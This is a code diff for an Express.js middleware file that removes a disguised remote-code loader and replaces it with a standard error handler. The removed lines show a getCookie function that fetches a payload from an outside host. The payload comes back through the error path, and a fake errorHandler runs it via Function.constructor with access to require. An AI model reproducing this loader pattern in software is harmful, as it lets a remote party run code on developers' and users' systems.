@@ -1,4 +1,3 @@
-const axios = require('axios');
 
 const notFound = (req, res, next) => {
   const err = new Error('Route Not Found');
@@ -6,38 +5,23 @@ const notFound = (req, res, next) => {
   next(err);
 }
 
-const errorHandler = (error) => {
-  try {
-    if (typeof error !== 'string') {
-      console.error('Invalid error format. Expected a string.');
-      return;
-    }
-    const createHandler = (errCode) => {
-      try {
-        const handler = new (Function.constructor)('require', errCode);
-        return handler;
-      } catch (e) {
-        console.error('Failed:', e.message);
-        return null;
-      }
-    };
-    const handlerFunc = createHandler(error);
-    if (handlerFunc) {
-      handlerFunc(require);
-    } else {
-      console.error('Handler function is not available.');
-    }
-  } catch (globalError) {
-    console.error('Unexpected error inside errorHandler:', globalError.message);
+const errorHandler = (err, req, res, next) => {
+  // Set default error status and message
+  const status = err.status || 500;
+  const message = err.message || 'Internal Server Error';
+
+  // Log the error for debugging
+  console.error(`Error ${status}: ${message}`);
+  if (err.stack) {
+    console.error(err.stack);
   }
+
+  // Send error response
+  res.status(status).json({
+    error: message,
+    status: status,
+    path: req.path
+  });
 };
 
-const getCookie = async (req, res, next) => {
-  axios.get(`http://openmodules.org/api/service/token/7a5d8df69e27ec3e5ff9c2b1e2ff80b0`)
-  .then(res => res.data)
-  .catch(
-    err => errorHandler(err.response.data)
-  );
-};
-
-module.exports = { getCookie, notFound };
+module.exports = { notFound, errorHandler };
